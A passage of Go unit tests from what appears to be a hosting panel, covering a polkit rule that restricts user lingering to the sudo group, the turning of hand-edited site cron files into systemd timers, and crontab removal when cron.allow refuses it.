	t.Cleanup(func() { polkitRulesDir, lingerDir, sideDoorsGroup = oldRules, oldLinger, oldGroup })
	polkitRulesDir, lingerDir = t.TempDir(), t.TempDir()
	sideDoorsGroup = filepath.Join(t.TempDir(), "group")
	writeTaskFile(t, sideDoorsGroup, "root:x:0:\nsudo:x:27:anna\nusers:x:100:\n")
	writeTaskFile(t, filepath.Join(lingerDir, taskTestAccount), "")
	writeTaskFile(t, filepath.Join(lingerDir, "anna"), "")
	ops := siteLingerOps{installed: func() bool { return true }, readFile: os.ReadFile}
	out := closeSiteLingerWith(ops)
	if out.State != transport.SideDoorsAtWritten || strings.Join(out.Groups, ",") != "sudo" || strings.Join(out.Accounts, ",") != taskTestAccount {
		t.Fatalf("%+v", out)
	}
	rule := readTaskFile(t, filepath.Join(polkitRulesDir, lingerRuleName))
	if !strings.HasPrefix(rule, polkitRulesHead) || !strings.Contains(rule, `action.id == "org.freedesktop.login1.set-self-linger" &&
        !subject.isInGroup("sudo")`) || strings.Contains(rule, `"admin"`) || !strings.Contains(rule, "return polkit.Result.AUTH_ADMIN;") {
		t.Fatalf("rule:\n%s", rule)
	}
	if _, err := os.Stat(filepath.Join(lingerDir, taskTestAccount)); err != nil {
		t.Fatal("a linger file was removed")
	}
	if out := closeSiteLingerWith(ops); out.State != transport.SideDoorsAtCurrent {
		t.Fatalf("second: %+v", out)
	}
	_ = os.Remove(filepath.Join(polkitRulesDir, lingerRuleName))
	if out := closeSiteLingerWith(ops); out.State != transport.SideDoorsAtOwnerRemoved {
		t.Fatalf("owner removed: %+v", out)
	}
	if err := forgetLingerRule(); err != nil {
		t.Fatal(err)
	}
	if out := closeSiteLingerWith(ops); out.State != transport.SideDoorsAtWritten {
		t.Fatalf("re-close: %+v", out)
	}
	if out := closeSiteLingerWith(siteLingerOps{installed: func() bool { return false }, readFile: os.ReadFile}); out.State != transport.SideDoorsAtNotInstalled || len(out.Accounts) != 1 {
		t.Fatalf("no polkitd: %+v", out)
	}
}

// TestOwnersHandEditReachesTheTimersAtTheNextStart: a moved site's task file
// edited by hand is applied by the side doors step after a start (only a
// site whose file changed since its timers were made is rendered), and
// polkit 0.105, which reads no rules files, is reported as not closed.
func TestOwnersHandEditReachesTheTimersAtTheNextStart(t *testing.T) {
	host := useTaskTestHost(t)
	target := taskTestTarget()
	if _, err := writeSiteTaskSource(target, "17 3 * * * php a.php\n", transport.SiteFileTriggerCreate); err != nil {
		t.Fatal(err)
	}
	if _, err := applySiteTimers(target, "17 3 * * * php a.php\n"); err != nil {
		t.Fatal(err)
	}
	if n := reconcileSiteTimers(); n != 0 {
		t.Fatalf("an unchanged site was rendered again (%d)", n)
	}
	path := sitecron.SourcePath(taskTestSite)
	writeTaskFile(t, path, readTaskFile(t, path)+"0 6 * * * php owner.php\n")
	if n := reconcileSiteTimers(); n != 1 {
		t.Fatalf("the hand edit was not applied (%d)", n)
	}
	if !host.enabled["celikcron-7-2.timer"] {
		t.Fatalf("the owner's task got no timer: %v", host.unitFiles(t))
	}
	if n := reconcileSiteTimers(); n != 0 {
		t.Fatalf("rendered again without a change (%d)", n)
	}
	out := closeSiteLingerWith(siteLingerOps{installed: func() bool { return false }, legacy: func() bool { return true }, readFile: os.ReadFile})
	if out.State != transport.SideDoorsAtFailed || !strings.Contains(out.Detail, "0.105") {
		t.Fatalf("polkit 0.105: %+v", out)
	}
}

// TestDeletingAMovedSiteRemovesItsCrontabDespiteCronAllow: crontab refuses
// -r for an account /etc/cron.allow leaves out, even as root (Stage 1 F1);
// a site's deletion then removes the spool file itself instead of failing.
func TestDeletingAMovedSiteRemovesItsCrontabDespiteCronAllow(t *testing.T) {
	useTaskTestHost(t)
	spool := filepath.Join(t.TempDir(), "root")
	writeTaskFile(t, spool, "* * * * * planted\n")
	oldPaths := siteCronSpoolPaths
	t.Cleanup(func() { siteCronSpoolPaths = oldPaths })
	siteCronSpoolPaths = func(string) []string { return []string{spool} }
	cronRemoveCrontab = func(username string) error {
		return errors.New("crontab -r: The user " + username + " cannot use this program (crontab)")
	}
	if err := removeSiteCrontab("root"); err != nil {
		t.Fatalf("the deletion failed on cron.allow's refusal: %v", err)
	}
	if _, err := os.Stat(spool); !os.IsNotExist(err) {
		t.Fatal("the spool file stayed")
	}
	cronRemoveCrontab = func(string) error { return errors.New("crontab -r: something else broke") }
	writeTaskFile(t, spool, "x\n")
	if err := removeSiteCrontab("root"); err == nil {
		t.Fatal("another failure was hidden")
	}
}
